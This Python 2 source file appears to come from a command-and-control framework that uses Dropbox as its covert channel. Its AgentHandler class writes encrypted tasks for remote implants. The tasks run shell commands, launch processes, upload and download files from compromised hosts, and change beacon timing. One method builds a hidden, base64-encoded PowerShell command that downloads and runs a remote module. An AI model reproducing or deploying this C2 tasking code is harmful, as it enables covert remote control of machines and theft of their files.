# -*- coding: utf8 -*-
import config as cfg
from lib import helpers
from lib.crypto import Crypto
import os.path

#****************************************************************************************
# Class handling high level interactions with agents
#****************************************************************************************
class AgentHandler:
	""" This class provides all functions to task remote agents
	"""
		
	#------------------------------------------------------------------------------------
	def __init__(self, dropboxHandler, statusHandler):
		self.dropboxHandler = dropboxHandler
		self.statusHandler = statusHandler
		self.agentID = None
			
	#------------------------------------------------------------------------------------
	def taskAgentWithCLI(self, cmd):
		# Create a task
		task = self.statusHandler.createTask(self.agentID, "runCLI", args = [cmd])
		
		# Prepare the task format, then put the task into the command file
		data = "runCLI\n{}\n{}\n{}".format(task['id'],cmd,helpers.randomString(16))
		r = self.dropboxHandler.putFile(self.statusHandler.getAgentAttribute(self.agentID, 'commandFile'), Crypto.encryptData(data, self.statusHandler.masterKey))

		if r is not None:
			# Commit this task for the current agent
			self.statusHandler.commitTask(task)
			#print helpers.color("[+] Agent with ID [{}] has been tasked with task ID [{}]".format(self.agentID, task['id']))
		else:
			print helpers.color("[!] Error tasking agent with ID [{}]".format(self.agentID))

	#------------------------------------------------------------------------------------
	def taskAgentWithLaunchProcess(self, exePath, parameters):
		# Create a task
		task = self.statusHandler.createTask(self.agentID, "launchProcess", args = [exePath, parameters])
		
		# Prepare the task format, then put the task into the command file
		data = "launchProcess\n{}\n{}\n{}\n{}".format(task['id'],exePath, parameters,helpers.randomString(16))
		r = self.dropboxHandler.putFile(self.statusHandler.getAgentAttribute(self.agentID, 'commandFile'), Crypto.encryptData(data, self.statusHandler.masterKey))

		if r is not None:
			# Commit this task for the current agent
			self.statusHandler.commitTask(task)
			print helpers.color("[+] Agent with ID [{}] has been tasked with task ID [{}]".format(self.agentID, task['id']))
		else:
			print helpers.color("[!] Error tasking agent with ID [{}]".format(self.agentID))

	#------------------------------------------------------------------------------------
	def taskAgentWithRunModule(self, moduleName, moduleArgs):
		# Create a task
		task = self.statusHandler.createTask(self.agentID, "runModule", args = [moduleName, moduleArgs])
		
		# Construct the powershell code from a template, substituting palceholders with proper parameters
		xorKey = Crypto.convertKey(self.statusHandler.masterKey, outputFormat = "sha256")
		parameters = {'xorKey': xorKey, 'moduleURL': self.statusHandler.publishedModuleList[moduleName],'moduleArgs': moduleArgs}
		posh = helpers.convertFromTemplate(parameters, cfg.defaultPath['runPSModuleTpl'])
		if posh == None: return
		
		# Turn the powershell code into a suitable powershell base64 encoded one line command
		base64Payload = helpers.powershellEncode(posh)
		
		# Create the final command
		cmd = "powershell.exe -NoP -sta -NonI -W Hidden -Enc {}".format(base64Payload)
		
		# Prepare the task format, then put the task into the command file
		data = "runCLI\n{}\n{}\n{}".format(task['id'],cmd,helpers.randomString(16))
		r = self.dropboxHandler.putFile(self.statusHandler.getAgentAttribute(self.agentID, 'commandFile'), Crypto.encryptData(data, self.statusHandler.masterKey))

		if r is not None:
			# Commit this task for the current agent
			self.statusHandler.commitTask(task)
			print helpers.color("[+] Agent with ID [{}] has been tasked with task ID [{}]".format(self.agentID, task['id']))
		else:
			print helpers.color("[!] Error tasking agent with ID [{}]".format(self.agentID))
			
	#------------------------------------------------------------------------------------
	def taskAgentWithSendFile(self, localFile, destinationPath):
		# Creating the remote file path (used on the DropBox API server)
		fileName = os.path.basename(localFile)
		remoteFilePath = "/" + self.agentID + ".rsc"
		
		# First upload the localFile to DropBox
		try:
			with open(localFile) as fileHandle:
				print helpers.color("[*] Uploading file [{}] to [{}]".format(localFile, remoteFilePath))
				r = self.dropboxHandler.putFile(remoteFilePath, fileHandle.read())
				fileHandle.close()
				
				if r is None:
					return
		except IOError:
			print helpers.color("[!] Could not open or read file [{}]".format(localFile))
			return
		
		# Once the local file is properly uploaded, proceed with tasking the agent
		# Create a task
		task = self.statusHandler.createTask(self.agentID, "sendFile", args = [localFile, destinationPath])
		
		# Prepare the task format, then put the task into the command file
		data = "downloadFile\n{}\n{}\n{}\n{}\n{}".format(task['id'], remoteFilePath, destinationPath, fileName, helpers.randomString(16))
		r = self.dropboxHandler.putFile(self.statusHandler.getAgentAttribute(self.agentID, 'commandFile'), Crypto.encryptData(data, self.statusHandler.masterKey))
		
		if r is not None:
			# Commit this task for the current agent
			self.statusHandler.commitTask(task)
			print helpers.color("[+] Agent with ID [{}] has been tasked with task ID [{}]".format(self.agentID, task['id']))
		else:
			print helpers.color("[!] Error tasking agent with ID [{}]".format(self.agentID))
	
	#------------------------------------------------------------------------------------
	def taskAgentWithGetFile(self, agentLocalFile):
			
		# Create a task
		task = self.statusHandler.createTask(self.agentID, "getFile", args = [agentLocalFile])
		
		# Prepare the task format, then put the task into the command file
		data = "sendFile\n{}\n{}\n{}".format(task['id'], agentLocalFile, helpers.randomString(16))
		r = self.dropboxHandler.putFile(self.statusHandler.getAgentAttribute(self.agentID, 'commandFile'), Crypto.encryptData(data, self.statusHandler.masterKey))
		
		if r is not None:
			# Commit this task for the current agent
			self.statusHandler.commitTask(task)
			print helpers.color("[+] Agent with ID [{}] has been tasked with task ID [{}]".format(self.agentID, task['id']))
		else:
			print helpers.color("[!] Error tasking agent with ID [{}]".format(self.agentID))
	
	#------------------------------------------------------------------------------------
	def taskAgentWithSleep(self, sleepAmount):
		# Create a task
		task = self.statusHandler.createTask(self.agentID, "sleep", args = [str(sleepAmount)])
		
		# Prepare the task format, then put the task into the command file
		data = "sleep\n{}\n{}\n{}".format(task['id'], sleepAmount, helpers.randomString(16))
		r = self.dropboxHandler.putFile(self.statusHandler.getAgentAttribute(self.agentID, 'commandFile'), Crypto.encryptData(data, self.statusHandler.masterKey))
		
		if r is not None:
			# Commit this task for the current agent
			self.statusHandler.commitTask(task)
			print helpers.color("[+] Agent with ID [{}] has been tasked with task ID [{}]".format(self.agentID, task['id']))
		else:
			print helpers.color("[!] Error tasking agent with ID [{}]".format(self.agentID))
			
	#------------------------------------------------------------------------------------
	def taskAgentWithNewPolling(self, period, deviation):
		# Create a task
		task = self.statusHandler.createTask(self.agentID, "polling", args = [str(period), str(deviation)])
		
		# Prepare the task format, then put the task into the command file
		data = "polling\n{}\n{}\n{}".format(task['id'], period, deviation, helpers.randomString(16))
		r = self.dropboxHandler.putFile(self.statusHandler.getAgentAttribute(self.agentID, 'commandFile'), Crypto.encryptData(data, self.statusHandler.masterKey))
		
		if r is not None:
			# Commit this task for the current agent
			self.statusHandler.commitTask(task)
			print helpers.color("[+] Agent with ID [{}] has been tasked with task ID [{}]".format(self.agentID, task['id']))
		else:
			print helpers.color("[!] Error tasking agent with ID [{}]".format(self.agentID))
	
	#------------------------------------------------------------------------------------
	def taskAgentWithStop(self):
		# Create a task
		task = self.statusHandler.createTask(self.agentID, "stop")
		
		# Prepare the task format, then put the task into the command file
		data = "stop\n{}\n{}".format(task['id'], helpers.randomString(16))
		r = self.dropboxHandler.putFile(self.statusHandler.getAgentAttribute(self.agentID, 'commandFile'), Crypto.encryptData(data, self.statusHandler.masterKey))
		
		if r is not None:
			# Commit this task for the current agent
			self.statusHandler.commitTask(task)
			print helpers.color("[+] Agent with ID [{}] has been tasked with task ID [{}]".format(self.agentID, task['id']))
		else:
			print helpers.color("[!] Error tasking agent with ID [{}]".format(self.agentID))
